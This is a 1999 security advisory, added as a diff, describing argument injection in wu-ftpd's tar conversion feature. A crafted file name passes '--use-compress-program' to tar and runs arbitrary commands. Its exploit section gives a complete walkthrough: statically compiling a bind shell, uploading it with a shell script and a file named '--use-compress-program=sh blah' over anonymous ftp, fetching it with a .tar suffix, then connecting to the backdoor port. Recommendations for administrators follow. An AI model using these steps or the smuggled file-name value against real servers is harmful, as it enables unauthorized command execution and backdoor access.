@@ -1,0 +1,163 @@
+suid@suid.edu - the dangers of ftp conversions on misconfigured systems/ftpd (specifically wu-ftpd)
+
+Summary:
+
+	There exists a vulnerability with certain configurations of certain ftp daemons with which users with a valid
+	ftp only acccount on a system may execute arbitrary commands (including binaries supplied by themselves). There
+	also exists the possibilty that anonymous ftp users may execute arbitrary commands (also including binaries
+	supplied by themselves).
+
+	While this vulnerability is entirely configuration dependent. The required configuration is rather common. The
+	requirements can be found in the example exploit section. Usually such misconfigurations are made only by the
+	security-handicapped, and the documentation-illiterate. There is volumous amounts of documentation around which
+	warn against this kind of configuration however it does not touch on this exact problem. Nor does it stop them from
+	making the same mistakes time after time.
+
+Background:
+
+	FTP Conversion is the name given to the process whereby a user can convert/archive/compress data on the fly 
+	when retrieving files from a FTP server. This is done when the FTP user requests a filename and appends
+	.tar/.tar.gz/.Z/.gz to the filename. The FTP then opens a pipe through the requested binary (/bin/tar for example) 
+	and sends the file through this pipe to the user.
+
+Vulnerability:
+
+	If a user with intent crafts a filename beginning with a '-' sign it is possible to pass arbitrary flags to the
+	command invoked by FTPD. If the user also includes spaces in this filename, they may pass further arguments. Modern
+	tar implementations include some fairly interesting arguments. For the purposes of lftpdthis advisory I will only
+	detail one. 
+	
+		From the tar(1) man page:
+
+		--use-compress-program PROG
+	              filter the archive through PROG (which must accept -d)
+
+	So it can be seen quite obviously that the flag:
+
+		--use-compress-program=id
+
+	will invoke the id command as a compression program for tar to filter through, obviously failing in the 
+	process, but trying nonetheless.
+
+	Using this mechanism it is possible to invoke any command in the path. It is also, as mentioned previously, possible
+	to pass those commands further arguments.
+
+Impact:
+	The impacts of this bug are that any command within the path may be executed by users who may not have the ability to
+	execute commands otherwise. If those commands can be coaxed into running other commands, a user may manage an
+	interactive shell. Impacts may be restricted by the default behaviour of wu-ftpd to chroot() the anonymous ftp user. 
+	However it is still possible for users to upload their own binaries and use your comprimised FTP server for something
+	like:
+		- launching attacks on your internal network which they may not have had the ability to do previously due to
+			ACL's etc
+		- launching denial of service attacks on other sites from your FTP server
+		- taking part in distributed attacks, or distributed denial service attacks, using your comprimised FTP server
+
+Tested On:
+
+	It must be stated here that this vulnerability is quite cross platform in that it is possible for FTP site
+	administrators running wu-ftpd on any operating system to have configured FTPD in this manner. However it is generally
+	more prevalant on Linux installations.
+
+	I have verified this vulnerability against the following configuration:
+	
+		RedHat (5.2, 6.0, 6.1)
+		anonftp package version 2.8.1
+		wu-ftpd (2.4.2, 2.5.0, 2.6.0) 
+
+Exploit Information:
+
+	This vulnerability is simple to exploit. However to exploit it you must be able to upload/download files. (e.g. a
+	mode 0777 incoming directory). Pretty common right? 
+
+	I am only going to document 1 method of exploiting this. There are many, I leave it as an excercise to the
+	reader to take things further. 
+
+	For the purposes of this exploit you also need a shell in the remote path. For example, a RedHat machine with the
+	anonftp package installed has exactly what you need.
+
+	Firstly, assuming you are running the same platform as your target, statically compile some sort of backdoor program,
+	The easiest thing I can think of to use is bindshell.c. 
+
+	$ gcc bindshell.c -o b -static
+	
+	Secondly, tar this up. You will need to tar it up because the remote side will rarely have the ability to change
+	permissions at this stage. (SITE CHMOD rarely works on anonymous ftp sites)
+
+	$ tar -cf b.tar b
+
+	Create a script of things you want to do on the remote site, this will be interpreted by bash or sh.
+
+	$ cat > blah
+	# 
+	/bin/tar -xf b.tar
+	./b
+	^D
+
+	Leave the first line as a comment. 
+
+	Create a empty file called "--use-compress-program=sh blah"
+
+	$ > "--use-compress-program=sh blah"
+
+	Connect to your target ftp server.
+
+	$ ftp localhost
+	Connected to localhost.
+	220 localhost.localdomain FTP server (Version wu-2.6.0(1) Tue Sep 21 10:10:10 EDT 2000) ready.
+	Name (localhost:suid): ftp
+	331 Guest login ok, send your complete e-mail address as password.
+	Password:
+	230 Guest login ok, access restrictions apply.
+	Remote system type is UNIX.
+	Using binary mode to transfer files.
+	ftp> 
+
+	Change to your world writable directory:
+
+	ftp> cd /incoming
+
+	Store your files:
+
+	ftp> put blah
+	ftp> put b.tar
+	ftp> put "--use-compress-program=sh blah"
+
+	Now using TAR conversion, get your "--use-compress-program=sh blah" file.
+
+	ftp> get "--use-compress-program=sh blah".tar
+
+	It should open a connection then freeze. Now telnet to your bindshell port.	
+
+Recommendations:
+
+	WU-FTPD have taken the stance that because this vulnerability is more a configuration issue than anything else, they
+	do not plan on releasing a patch. This is correct.
+
+	You would be wise to evaluate the need for anonymous ftp on your server and remove the ability if possible.
+
+	If you require anonymous ftp access, ensure there are no world writable directories, also ensure that the smallest
+	amount of commands you can get away with exist in the ~ftp/bin directory.
+
+	Disable ftp conversions in /etc/ftpacess
+
+	Consult your documentation and follow the advice contained within. It is worth it.
+
+	CERT and Auscert have released numerous papers, and advisories on these types of misconfigurations in the past
+	read them!
+
+
+
+
+	See my website for some more information:
+	http://www.suid.edu/
+	
+
+Greetings:
+
+	cr@rotten.com
+	yowie@virus.beergrave.net
+	duke@viper.net.au
+	ncb@attrition.org
+
+18th December, 1999
